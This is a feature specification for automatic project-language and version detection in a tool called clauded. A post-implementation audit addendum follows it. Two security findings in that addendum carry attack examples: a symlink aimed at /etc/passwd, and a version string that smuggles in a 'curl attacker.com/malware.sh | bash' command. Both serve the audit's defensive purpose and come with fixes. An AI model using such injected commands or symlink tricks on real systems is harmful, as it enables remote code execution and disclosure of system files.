# Feature Specification: Project Detection

## Overview

Automatic detection of programming languages, frameworks, tools, and version requirements from project files. Detection results pre-populate wizard defaults, reducing manual configuration while remaining fully overridable.

## Problem Statement

Currently, users must manually select every language, version, tool, and framework through the wizard—even when the project already contains explicit indicators (manifest files, version files, configuration). This creates unnecessary friction, especially for established projects with clear requirements.

## Goals

1. **Reduce wizard friction** — Pre-select languages and versions already evident in the project
2. **Improve accuracy** — Use authoritative sources (Linguist data, manifest files) rather than guessing
3. **Preserve user control** — Detection informs defaults; users can always override
4. **Stay current** — Leverage upstream Linguist data that tracks 600+ languages

## Non-Goals

- Runtime/dependency resolution (we detect declared requirements, not transitive deps)
- Code analysis beyond file-level detection (no AST parsing)
- Framework version detection (only language/runtime versions)
- Automatic provisioning without wizard confirmation

---

## Functional Requirements

### FR-1: Linguist Data Management

The system shall include vendored copies of GitHub Linguist's canonical language definition files.

**Required data files:**
| File | Purpose |
|------|---------|
| `languages.yml` | Extension → language mapping, interpreter names, language metadata |
| `heuristics.yml` | Disambiguation rules for ambiguous extensions (`.h`, `.pl`, etc.) |
| `vendor.yml` | Paths to exclude from detection (node_modules, vendor, etc.) |

**Behaviors:**
- Ship vendored copies of Linguist YAML files within the package
- Update vendored files periodically via development workflow (monthly or quarterly)
- No runtime network dependency for language detection

### FR-2: Language Detection

The system shall detect programming languages present in a project directory.

**Detection strategies (applied in order):**

1. **Vendor/generated exclusion** — Skip paths matching `vendor.yml` patterns
2. **Extension matching** — Map file extensions to languages via `languages.yml`
3. **Filename matching** — Recognize special files (`Makefile`, `Dockerfile`, `Rakefile`)
4. **Shebang detection** — Parse `#!` lines for interpreter hints
5. **Heuristic disambiguation** — Apply `heuristics.yml` rules for ambiguous extensions

**Output:**
- List of detected languages with confidence scores (high/medium/low)
- Byte count per language (for relative prominence)
- Primary language determination (highest byte count, excluding markup/config)

### FR-3: Version Detection

The system shall detect requested runtime versions from version specification files.

**Version file sources:**

| Runtime | Version files | Format |
|---------|---------------|--------|
| Python | `.python-version`, `pyproject.toml [project.requires-python]`, `setup.py` | Semver constraint or exact |
| Node.js | `.nvmrc`, `.node-version`, `package.json [engines.node]` | Semver constraint or exact |
| Java | `.java-version`, `pom.xml [maven.compiler.source]`, `build.gradle [sourceCompatibility]` | Major version |
| Kotlin | `build.gradle.kts [kotlin version]` | Semver |
| Rust | `rust-toolchain.toml`, `rust-toolchain` | Channel (stable/nightly) or version |
| Go | `go.mod [go directive]` | Semver |

**Multi-version resolution:**
- When multiple sources specify versions, prefer explicit version files over embedded config
- Priority: `.{runtime}-version` > `.tool-versions` > manifest files

**Universal version file:**
- Parse `.tool-versions` (asdf format) for any runtime it specifies

### FR-4: Framework & Tool Detection

The system shall detect frameworks and tools from manifest file dependencies.

**Manifest file parsing:**

| Manifest | Detectable items |
|----------|-----------------|
| `package.json` | Node.js frameworks (react, vue, angular, express, next, nest), tools (playwright, jest, webpack) |
| `pyproject.toml` | Python frameworks (django, flask, fastapi), tools (pytest, poetry, uv) |
| `requirements.txt` | Python packages (fallback when pyproject.toml absent) |
| `Cargo.toml` | Rust frameworks (actix, rocket, tokio) |
| `go.mod` | Go frameworks (gin, echo, fiber) |
| `pom.xml` | Java frameworks (spring-boot, quarkus), build tool (maven) |
| `build.gradle` / `build.gradle.kts` | Java/Kotlin frameworks (spring-boot, ktor), build tool (gradle) |
| `docker-compose.yml` / `compose.yml` | Database services (postgres, redis, mysql, mongodb) |
| `Dockerfile` | Docker requirement |

**Dependency matching:**
- Match against known package names that map to clauded-supported tools
- Detect both production and development dependencies where applicable

### FR-5: Database Detection

The system shall infer database requirements from project configuration.

**Detection sources:**
- Docker Compose service definitions (image names)
- Environment variable patterns in `.env.example`, `.env.sample`
- ORM configuration files (database URLs, adapter names)
- Manifest dependencies (psycopg2, redis-py, mysql-connector, prisma)

**Supported databases:**
- PostgreSQL
- Redis
- MySQL

### FR-6: Wizard Integration

Detection results shall inform wizard defaults without bypassing user confirmation.

**Behaviors:**
- Run detection before wizard prompt sequence
- Pre-select detected languages with their detected versions
- Pre-check detected tools, databases, and frameworks in multi-select prompts
- Display detection summary before wizard begins (what was auto-detected and why)
- Allow `--no-detect` flag to skip detection and use static defaults

**Confidence display:**
- High confidence: Pre-selected, brief indicator
- Medium confidence: Pre-selected, noted as "detected"
- Low confidence: Not pre-selected, shown as suggestion

### FR-7: Detection Report

The system shall provide a detection-only mode for inspection.

**CLI interface:**
- `clauded --detect` — Run detection and display results without launching wizard
- Output: JSON or human-readable summary of all detected items
- Include source file that triggered each detection

---

## Detection Mapping

### Language → clauded Environment

| Detected Language | clauded Config | Version Source Priority |
|-------------------|----------------|------------------------|
| Python | `environment.python` | `.python-version` > `pyproject.toml` > infer from syntax |
| JavaScript, TypeScript | `environment.node` | `.nvmrc` > `.node-version` > `package.json` |
| Java | `environment.java` | `.java-version` > `pom.xml` > `build.gradle` |
| Kotlin | `environment.kotlin` | `build.gradle.kts` kotlin plugin version |
| Rust | `environment.rust` | `rust-toolchain.toml` > `rust-toolchain` |
| Go | `environment.go` | `go.mod` go directive |

### Framework → clauded Tools/Frameworks

| Detected Framework/Tool | clauded Config |
|------------------------|----------------|
| Playwright (any ecosystem) | `frameworks: [playwright]` |
| Docker/Compose present | `tools: [docker]` |
| AWS SDK dependencies | `tools: [aws-cli]` |
| GitHub API dependencies, `.github/` dir | `tools: [gh]` |
| Gradle build files | `tools: [gradle]` |

### Database → clauded Databases

| Detection Signal | clauded Config |
|-----------------|----------------|
| postgres/postgresql in compose, psycopg2/asyncpg deps | `databases: [postgresql]` |
| redis in compose, redis-py/ioredis deps | `databases: [redis]` |
| mysql/mariadb in compose, mysql-connector deps | `databases: [mysql]` |

---

## Non-Functional Requirements

### NFR-1: Performance

- Full project scan completes in <2 seconds for typical projects (<10k files)
- Vendor directory exclusion prevents scanning of node_modules, .venv, etc.
- File content sampling limited to first 8KB for shebang/heuristic detection

### NFR-2: Reliability

- Detection failures are non-fatal; wizard falls back to static defaults
- Malformed manifest files logged as warnings, not errors

### NFR-3: Accuracy

- Extension-based detection matches Linguist accuracy (battle-tested on millions of repos)
- Version detection prefers explicit version files over inferred versions
- False positives acceptable if user can easily override in wizard

### NFR-4: Maintainability

- Linguist data updated via simple cache refresh, no code changes required
- Framework/package mappings defined declaratively (data, not code)
- Detection logic modular and testable per-strategy

---

## Data Structures

### Detection Result

```
DetectionResult:
  languages: List[DetectedLanguage]
  versions: Dict[Runtime, VersionSpec]
  frameworks: List[DetectedFramework]
  tools: List[DetectedTool]
  databases: List[DetectedDatabase]
  scan_stats:
    files_scanned: int
    files_excluded: int
    duration_ms: int

DetectedLanguage:
  name: str
  confidence: high | medium | low
  byte_count: int
  source_files: List[str]  # sample of files that triggered detection

VersionSpec:
  version: str
  source_file: str
  constraint_type: exact | minimum | range

DetectedFramework | DetectedTool | DetectedDatabase:
  name: str
  confidence: high | medium | low
  source_file: str
  source_evidence: str  # the dependency name or config key that triggered
```

### Linguist Data

```
LinguistData:
  languages: Dict[Extension, LanguageInfo]
  heuristics: List[HeuristicRule]
  vendor_patterns: List[GlobPattern]
```

---

## Acceptance Criteria

### Language Detection

- [ ] Detects Python from `.py` files and returns confidence high
- [ ] Detects JavaScript/TypeScript from `.js`/`.ts` files
- [ ] Detects Java from `.java` files
- [ ] Detects Kotlin from `.kt` files
- [ ] Detects Rust from `.rs` files and `Cargo.toml`
- [ ] Detects Go from `.go` files and `go.mod`
- [ ] Excludes `node_modules/`, `vendor/`, `.venv/` from scanning
- [ ] Disambiguates `.h` files using heuristics

### Version Detection

- [ ] Reads Python version from `.python-version`
- [ ] Reads Node version from `.nvmrc`
- [ ] Reads Go version from `go.mod`
- [ ] Reads Rust channel from `rust-toolchain.toml`
- [ ] Parses `.tool-versions` for any supported runtime
- [ ] Extracts `requires-python` from `pyproject.toml`
- [ ] Extracts `engines.node` from `package.json`

### Framework Detection

- [ ] Detects Django/Flask/FastAPI from Python dependencies
- [ ] Detects React/Vue/Angular from JavaScript dependencies
- [ ] Detects Spring Boot from Java/Kotlin dependencies
- [ ] Detects Playwright from any ecosystem's dependencies

### Database Detection

- [ ] Detects PostgreSQL from docker-compose services
- [ ] Detects Redis from docker-compose services
- [ ] Detects MySQL from docker-compose services
- [ ] Detects databases from ORM adapter dependencies

### Wizard Integration

- [ ] Pre-selects detected languages in wizard
- [ ] Pre-fills detected versions in wizard
- [ ] Pre-checks detected tools/databases/frameworks
- [ ] Displays detection summary before wizard prompts
- [ ] `--no-detect` flag bypasses detection
- [ ] `--detect` flag outputs detection results without wizard

### Linguist Data

- [ ] Vendored Linguist YAML files included in package
- [ ] Update script fetches latest from GitHub Linguist repository
- [ ] Vendored data used directly with no runtime network calls

---

## Open Questions

1. **Monorepo handling** — Should detection scope to subdirectories, or always scan from project root?
2. **Confidence thresholds** — What byte count / file count thresholds distinguish high/medium/low confidence?
3. **Version constraint resolution** — When `requires-python = ">=3.10"`, which version should we default to (latest supported, or minimum)?

---

## Future Considerations

- **IDE integration** — Export detection results for editor plugins
- **Template suggestions** — Recommend clauded templates based on detected stack
- **Dependency security** — Flag outdated/vulnerable versions during detection
- **Custom detection rules** — User-defined mappings in `.clauded.yaml` or global config

---

## Addendum: Post-Implementation Remediation Issues

*Generated: 2026-01-26 | Verification Round: 1 | Workflow Version: 2.5.0*

This addendum documents issues identified during system verification that require remediation before the feature is considered production-ready. Issues are categorized by severity and type.

### Implementation Status Summary

| Category | Passed | Failed | Partial |
|----------|--------|--------|---------|
| Core Detection (FR-1 to FR-5) | ✓ | - | - |
| Wizard Integration (FR-6) | - | - | ✓ |
| CLI Detection Mode (FR-7) | ✓ | - | - |
| Security | - | ✗ | - |
| Test Coverage | - | - | ✓ |
| Code Quality | - | - | ✓ |

**Test Results:** 347/347 tests passing (100% pass rate)

---

### CRITICAL: Security Issues

#### SEC-001: Symlink Exploitation Vulnerability
**Severity:** 8/10 | **Category:** SECURITY | **Status:** OPEN

**Description:**
The detection system follows symbolic links without validation, enabling attackers to:
1. Read arbitrary files by creating symlinks to sensitive files
2. Poison environment detection via symlinked manifest files
3. Bypass vendor exclusions with renamed symlinks

**Evidence:**
- `version.py:139-150` - Reads `.python-version` symlink without `is_symlink()` check
- `framework.py:202-207` - Parses symlinked `pyproject.toml` without validation
- `linguist.py:308-310` - `rglob("*")` includes symlinked files

**Attack Example:**
```bash
# Attacker creates: .python-version -> /etc/passwd
# Detection reads /etc/passwd content as "version string"
```

**Remediation:**
```python
# Add to all file-reading functions:
if file_path.is_symlink():
    logger.warning(f"Skipping symlinked file: {file_path}")
    return None

resolved = file_path.resolve()
try:
    resolved.relative_to(project_path.resolve())
except ValueError:
    logger.warning(f"File outside project boundary: {resolved}")
    return None
```

**Files to Modify:**
- `src/clauded/detect/version.py` - All parse_*_version() functions
- `src/clauded/detect/framework.py` - All parse_*_dependencies() functions
- `src/clauded/detect/linguist.py` - detect_languages()
- `src/clauded/detect/database.py` - parse_docker_compose(), parse_env_files()

---

#### SEC-002: Command Injection via Version Strings
**Severity:** 9/10 | **Category:** SECURITY | **Status:** OPEN

**Description:**
Version strings from manifest files pass through detection without validation and are interpolated into Ansible shell commands during VM provisioning. Malicious version strings could execute arbitrary commands.

**Evidence:**
- `provisioner.py:133-138` - Raw version strings passed to Ansible
- `roles/python/tasks/main.yml:51` - `python{{ python_version }}` in shell command
- `roles/rust/tasks/main.yml:24` - `--default-toolchain {{ rust_version }}` in shell

**Attack Example:**
```bash
# Malicious .python-version content:
3.12; curl attacker.com/malware.sh | bash

# Results in Ansible executing:
curl ... | python3.12; curl attacker.com/malware.sh | bash
```

**Remediation:**
1. Add version string validation in `version.py`:
```python
import re

VERSION_PATTERNS = {
    "python": r"^\d+\.\d+(\.\d+)?$",
    "node": r"^\d+(\.\d+)*$",
    "rust": r"^(stable|nightly|beta|\d+\.\d+\.\d+)$",
    "go": r"^\d+\.\d+(\.\d+)?$",
    "java": r"^\d+$",
    "kotlin": r"^\d+\.\d+(\.\d+)?$",
}

def _validate_version(version: str, runtime: str) -> bool:
    pattern = VERSION_PATTERNS.get(runtime)
    if not pattern:
        return True
    return bool(re.match(pattern, version))
```

2. Reject invalid versions before storing in VersionSpec
3. Use Ansible `quote` filter in shell commands as defense-in-depth

**Files to Modify:**
- `src/clauded/detect/version.py` - Add validation to all parse functions
- `src/clauded/roles/*/tasks/main.yml` - Add `| quote` filter to version variables

---

### HIGH: Specification Gaps

#### SPEC-001: Missing Manifest Format Support
**Severity:** 7/10 | **Category:** SPEC_ISSUE | **Status:** OPEN

**Description:**
Four formats explicitly specified in FR-3 and FR-4 are not implemented:

| Format | Requirement | Status |
|--------|-------------|--------|
| `setup.py` (Python version) | FR-3:70 | ❌ Not implemented |
| `build.gradle.kts` (Java version) | FR-3:72 | ❌ Not implemented |
| `build.gradle` (Java frameworks) | FR-4:98 | ❌ Not implemented |
| MongoDB detection | FR-4:99 | ❌ Not implemented |

**Evidence:**
- `version.py:113-172` - No `setup.py` parsing
- `version.py:249-323` - Only checks `build.gradle`, not `build.gradle.kts`
- `framework.py:337-391` - Docstring claims build.gradle support but only implements pom.xml
- `database.py:19` - `SUPPORTED_DATABASES = {"postgresql", "redis", "mysql"}` excludes MongoDB

**Remediation:**
1. Add `setup.py` parsing using regex for `python_requires`
2. Extend Java version detection to include `build.gradle.kts`
3. Implement `build.gradle` dependency parsing for Java frameworks
4. Add MongoDB to supported databases and detection patterns

**Files to Modify:**
- `src/clauded/detect/version.py:172` - Add setup.py handling
- `src/clauded/detect/version.py:321` - Add build.gradle.kts check
- `src/clauded/detect/framework.py:390` - Add build.gradle parsing
- `src/clauded/detect/database.py:19-24` - Add MongoDB patterns

---

#### SPEC-002: Confidence Display Mismatch
**Severity:** 6/10 | **Category:** SPEC_ISSUE | **Status:** OPEN

**Description:**
Confidence levels are displayed uniformly for all levels, not matching the spec-defined distinctions:

| Confidence | Spec Requirement | Current Implementation |
|------------|------------------|----------------------|
| High | "Brief indicator" | `(high)` |
| Medium | "Noted as 'detected'" | `(medium)` |
| Low | "Shown as suggestion" | `(low)` |

**Evidence:**
- `cli_integration.py:60-93` - All confidence levels use same format
- Spec lines 132-135 define different display requirements per level

**Remediation:**
Update `display_detection_summary()` to differentiate:
```python
if item.confidence == "high":
    print(f"    • {item.name}")  # Brief, no qualifier
elif item.confidence == "medium":
    print(f"    • {item.name} (detected)")
else:  # low
    print(f"    • {item.name} (suggestion)")
```

**Files to Modify:**
- `src/clauded/detect/cli_integration.py:60-93`

---

### HIGH: Test Coverage Gaps

#### TEST-001: Missing End-to-End Integration Tests
**Severity:** 8/10 | **Category:** TEST_ISSUE | **Status:** OPEN

**Description:**
No automated tests validate the complete workflow from CLI entry point through detection to Config creation. All 347 tests verify components in isolation.

**E2E Test Scenarios to Implement:**

| # | Scenario | Validates |
|---|----------|-----------|
| 1 | Python Django + PostgreSQL detection | FR-1 to FR-5: Full detection flow |
| 2 | Node.js React + Playwright + Docker | FR-2 to FR-4, FR-6: Multi-tool detection |
| 3 | Multi-language (Java + TypeScript) | FR-2 to FR-4: Multi-language/framework |
| 4 | CLI `--detect` flag (detection-only mode) | FR-7: Detection report mode |
| 5 | Wizard integration with detection results | FR-6: Pre-populated defaults |
| 6 | Malformed manifest graceful degradation | NFR-2: Reliability |
| 7 | CLI `--no-detect` flag bypasses detection | FR-6: Opt-out behavior |
| 8 | Vendor directory exclusion (node_modules, .venv) | FR-1: Vendor patterns |

**Test Scenario Details:**

**Scenario 1: Python Django Project**
- Setup: `pyproject.toml` with django, `.python-version` with 3.12, `docker-compose.yml` with postgres
- Expected: Python (high), version 3.12, django (high), postgresql (high)

**Scenario 2: Node.js React Project**
- Setup: `package.json` with react/playwright/engines.node, `.nvmrc` with 20, `Dockerfile`
- Expected: JavaScript (high), version 20, react (high), playwright (medium), docker (high)

**Scenario 3: Multi-Language Project**
- Setup: `pom.xml` with spring-boot, `.java-version`, `package.json` with angular, `.nvmrc`
- Expected: Java (high), TypeScript (high), versions for both, spring-boot + angular

**Scenario 5: Wizard Integration**
- Setup: Python project with fastapi, postgres, redis
- Expected: Wizard pre-selects Python 3.11, pre-checks fastapi, postgres, redis

**Scenario 6: Graceful Degradation**
- Setup: Invalid pyproject.toml, valid .python-version, valid .py files
- Expected: Partial results (Python detected, version detected, frameworks empty)

**Evidence:**
- `test_detect_integration.py` - Tests utility functions only
- `test_cli.py:193-209` - Mocks wizard, doesn't test detection path
- No test file for E2E workflow

**Remediation:**
Create `tests/test_e2e_detection_workflow.py` implementing all 8 scenarios.

**Files to Create:**
- `tests/test_e2e_detection_workflow.py`

---

#### TEST-002: Incomplete Property-Based Test Invariants
**Severity:** 8/10 | **Category:** TEST_ISSUE | **Status:** OPEN

**Description:**
Two critical invariants lack proper property-based test coverage:

1. **Vendor exclusion invariant:** "Excluded vendor paths never contribute to language detection"
   - Only 1 concrete test exists (`test_detect_languages_vendor_excluded`)
   - No `@given` decorator - not property-based

2. **Version semver invariant:** "Version detection always returns valid semver or None"
   - `test_malformed_python_version_returns_none` has tautological assertion:
     ```python
     assert spec is not None or spec is None  # Always True!
     ```

**Evidence:**
- `test_detect_linguist.py:248` - Concrete test, not property-based
- `test_version_detection.py:316` - Tautological assertion

**Remediation:**
1. Add property-based vendor exclusion test:
```python
@given(st.sampled_from(load_vendor_patterns()))
def test_vendor_paths_never_in_results(vendor_pattern, tmp_path):
    # Create file matching vendor pattern
    vendor_file = tmp_path / vendor_pattern.replace("*", "test.py")
    vendor_file.parent.mkdir(parents=True, exist_ok=True)
    vendor_file.write_text("# Python file in vendor")

    result = detect_languages(tmp_path)

    for lang in result:
        assert vendor_file not in lang.source_files
```

2. Fix tautological assertion:
```python
# Change from:
assert spec is not None or spec is None
# To:
assert spec is None  # Malformed input should return None
```

**Files to Modify:**
- `tests/test_detect_linguist.py` - Add property-based vendor test
- `tests/test_version_detection.py:316` - Fix assertion

---

### MEDIUM: Code Quality Issues

#### QUALITY-001: Dead Code
**Severity:** 2/10 | **Category:** QUALITY | **Status:** OPEN

**Description:**
One unused constant found:
- `database.py:19` - `SUPPORTED_DATABASES = {"postgresql", "redis", "mysql"}`

**Remediation:**
Remove line 19 from `src/clauded/detect/database.py`

---

#### QUALITY-002: Duplicate Utility Functions
**Severity:** 5/10 | **Category:** QUALITY | **Status:** OPEN

**Description:**
Two utility functions with identical purpose but different implementations:

| Function | Location | Implementation |
|----------|----------|----------------|
| `_parse_package_name()` | `framework.py:580-593` | Loop-based, no case normalization |
| `_extract_package_name()` | `database.py:43-53` | Chained splits, `.lower()` |

**Remediation:**
1. Create shared utility in `src/clauded/detect/utils.py`:
```python
def extract_package_name(dep_spec: str, normalize_case: bool = False) -> str:
    """Extract package name from dependency specification."""
    for sep in (">=", "<=", "==", "!=", ">", "<", "~=", "["):
        if sep in dep_spec:
            name = dep_spec.split(sep)[0].strip()
            return name.lower() if normalize_case else name
    name = dep_spec.strip()
    return name.lower() if normalize_case else name
```

2. Update `framework.py` and `database.py` to import from utils

**Files to Modify:**
- Create `src/clauded/detect/utils.py`
- `src/clauded/detect/framework.py:580-593` - Import from utils
- `src/clauded/detect/database.py:43-53` - Import from utils

---

#### QUALITY-003: Type Annotation Issues
**Severity:** 6/10 | **Category:** QUALITY | **Status:** OPEN

**Description:**
- 7 redundant `cast()` calls in `version.py:94-110`
- Type narrowing issue in `linguist.py:183` returning `Any`
- Missing `types-PyYAML` stub causing mypy errors

**Remediation:**
1. Remove redundant casts:
```python
# Change from:
return cast(Literal["exact", "minimum", "range"], "exact")
# To:
return "exact"
```

2. Fix type narrowing in `apply_heuristics()`
3. Add `types-PyYAML` to dev dependencies

**Files to Modify:**
- `src/clauded/detect/version.py:94-110`
- `src/clauded/detect/linguist.py:183`
- `pyproject.toml` - Add types-PyYAML

---

#### QUALITY-004: scan_stats Not Implemented
**Severity:** 5/10 | **Category:** IMPLEMENTATION_ISSUE | **Status:** OPEN

**Description:**
`scan_stats.files_scanned` and `scan_stats.files_excluded` always return 0. TODOs left in implementation.

**Evidence:**
- `detect/__init__.py:88-89` - Contains TODO comments
- ScanStats always created with zeros

**Remediation:**
1. Track counts in `detect_languages()`:
```python
def detect_languages(project_path: Path) -> tuple[list[DetectedLanguage], int, int]:
    """Returns (languages, files_scanned, files_excluded)"""
    scanned = 0
    excluded = 0
    for file_path in project_path.rglob("*"):
        if _is_excluded_by_vendor(file_path):
            excluded += 1
            continue
        scanned += 1
        # ... detection logic
    return languages, scanned, excluded
```

2. Update `detect()` to aggregate and populate ScanStats

**Files to Modify:**
- `src/clauded/detect/linguist.py` - Return counts
- `src/clauded/detect/__init__.py:87-91` - Aggregate counts

---

### LOW: Cleanup Tasks

#### CLEANUP-001: Obsolete Files
**Severity:** 3/10 | **Category:** QUALITY | **Status:** OPEN

**Description:**
Temporary directories created during development workflow should be cleaned up or gitignored:
- `.claude/` - Verification artifacts
- `.exploration/` - Architecture exploration context

**Remediation:**
Add to `.gitignore`:
```
.claude/
.exploration/
```

---

### Resolved Open Questions

Based on implementation decisions made during development:

| Question | Resolution |
|----------|------------|
| **Monorepo handling** | Detection scans from project root (directory where `clauded` is invoked). Subdirectory scoping is not supported in v1. |
| **Confidence thresholds** | High: >10 files OR >10KB. Medium: ≥3 files OR ≥1KB. Low: <3 files AND <1KB. |
| **Version constraint resolution** | When constraint given (e.g., `>=3.10`), wizard normalizes to minimum version. |

---

### Remediation Priority

| Priority | Issue ID | Description | Effort |
|----------|----------|-------------|--------|
| 1 | SEC-002 | Command injection via version strings | Substantial |
| 2 | SEC-001 | Symlink exploitation vulnerability | Substantial |
| 3 | TEST-001 | Missing E2E integration tests | Substantial |
| 4 | SPEC-001 | Missing manifest format support | Moderate |
| 5 | TEST-002 | Incomplete property-based tests | Moderate |
| 6 | SPEC-002 | Confidence display mismatch | Trivial |
| 7 | QUALITY-004 | scan_stats not implemented | Moderate |
| 8 | QUALITY-002 | Duplicate utility functions | Trivial |
| 9 | QUALITY-003 | Type annotation issues | Trivial |
| 10 | QUALITY-001 | Dead code | Trivial |
| 11 | CLEANUP-001 | Obsolete files | Trivial |

---

### Counterfactual Analysis

**What would have prevented the most severe issues?**

1. **SEC-002 (Command Injection):** A security threat model during architecture phase identifying untrusted input → shell command data flow would have caught this immediately.

2. **TEST-001 (Missing E2E):** Explicit E2E test acceptance criteria in the specification (e.g., "Integration tests SHALL validate complete workflow from entry point to Config creation").

3. **SPEC-001 (Missing Formats):** Contract-driven development with a checklist verifying each specified format has corresponding implementation and test.

**Recommended Process Improvements:**

1. Add security review checklist for file I/O operations
2. Require E2E test scenarios in feature specifications
3. Implement pre-commit validation for version string formats
4. Add specification compliance matrix to acceptance criteria
